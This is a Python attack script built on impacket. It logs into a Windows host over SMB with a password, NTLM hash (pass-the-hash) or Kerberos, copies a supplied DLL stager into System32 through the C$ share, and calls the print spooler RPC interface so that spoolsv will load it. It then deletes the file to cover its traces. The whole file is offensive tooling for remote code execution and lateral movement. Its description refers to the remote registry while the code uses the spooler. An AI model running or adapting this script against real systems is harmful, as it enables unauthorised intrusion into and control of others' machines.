#!/usr/bin/env python3
# -*- coding:utf-8 -*-
#
# Uploads a DLL to the remote host, and
# forces the DLL to be loaded into the
# spoolsv process.
#
import sys
import argparse
import random
import string
import time
from six import PY3

from getpass import getpass
from impacket.dcerpc.v5 import rprn
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import SMBConnection
from impacket.examples.utils import parse_target
from impacket.examples.secretsdump import RemoteOperations

class SpoolInject:
    def __init__( self, username = '', password = '', domain = '', hashes = None, aesKey = None, doKerberos = False, kdcHost = None, stager = None ):
        self.__username      = username
        self.__password      = password
        self.__domain        = domain
        self.__lmhash        = ''
        self.__nthash        = ''
        self.__aesKey        = aesKey
        self.__doKerberos    = doKerberos
        self.__kdcHost       = kdcHost
        self.__stager_pe     = stager
        self.__stager_pe_pth = '{}.dll'.format( ''.join( random.choice( string.ascii_lowercase ) for x in range( 10 ) ) )
        self.__smbConnection = None

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split( ':' )

    def run( self, addr ):
        self.__smbConnection = SMBConnection( addr, addr )

        if self.__doKerberos is False:
            self.__smbConnection.login( self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash )
        else:
            self.__smbConnection.kerberoslogin( self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, kdcHost = self.__kdcHost );

        # connect to C$ and upload DLL
        self.__smbConnection.putFile( 'C$', '/Windows/System32/{}'.format( self.__stager_pe_pth ), self.__stager_pe.read );

        # connect to ms-rprn and pull printer driver
        rpc = transport.SMBTransport( self.__smbConnection.getRemoteName(), self.__smbConnection.getRemoteHost(), filename = r'\spoolss', smb_connection = self.__smbConnection );
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind( rprn.MSRPC_UUID_RPRN );
        res = rprn.hRpcGetPrinterDriverDirectory( dce, NULL, NULL, 2 );
    def cleanup( self ):
        if self.__stager_pe:
            self.__stager_pe.close()
        if self.__smbConnection:
            self.__smbConnection.deleteFile( 'C$', '/Windows/System32/{}'.format( self.__stager_pe_pth ) );
            self.__smbConnection.logoff()

if __name__ in '__main__':
    parser = argparse.ArgumentParser( add_help = True, description = 'Forces a process to load a DLL through the remote registry.' )
    parser.add_argument( 'target', action = 'store', help = '[[domain/]username[:password]@]<targetName or address>' );
    parser.add_argument( '-stage', type = argparse.FileType( 'rb+' ), required = True, help = 'Path to the spooler.dll stager.' );
    
    group = parser.add_argument_group( 'authentication' );
    group.add_argument( '-hashes', action = 'store', metavar = 'LMHASH:NTHASH', help = 'NTLM hashes, format is LMHASH:NTHASH' )
    group.add_argument( '-no-pass', action = 'store_true', help ='don\'t ask for password (useful for -k)' )
    group.add_argument( '-k', action = 'store_true', help = 'Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line' );
    group.add_argument( '-aesKey', action = 'store', metavar = 'hex key', help = 'AES key to use for Kerberos Authentication (128 or 256 bits)' );
    group.add_argument( '-dc-ip', action = 'store', metavar = 'ip address', help = 'IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter' )
    group.add_argument( '-keytab', action = 'store', help = 'Read keys for SPN from keytab file' )

    if len( sys.argv ) == 1 :
        parser.print_help()
        sys.exit( 1 )

    options = parser.parse_args()

    domain, username, password, address = parse_target( options.target );

    if domain is None:
        domain = ''

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab( options.keytab, username, domain, options )

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        password = getpass( 'Password:' );

    if options.aesKey is not None:
        options.k = True

    try:
        Inj = SpoolInject( username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, options.stage )
        Inj.run( address )
        Inj.cleanup()
    except Exception as e:
        print( e )
        if Inj is not None: Inj.cleanup()
